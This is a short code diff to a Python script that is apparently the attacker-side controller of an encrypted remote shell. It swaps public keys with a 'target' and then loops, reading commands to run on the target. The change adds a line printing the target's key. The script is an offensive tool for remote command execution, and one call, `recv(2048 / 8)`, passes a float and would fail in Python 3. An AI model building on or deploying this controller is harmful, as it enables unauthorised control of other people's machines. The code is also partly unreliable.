@@ -18,6 +18,7 @@ print(f'attacker pub key: {pub_key}')
 conn.send(pub_key)
 
 target_pub_key = conn.recv(2048 / 8)
+print(f'target pub key: {target_pub_key}')
 
 while True:
     command = input("Enter command to execute or 'exit' to quit: ")
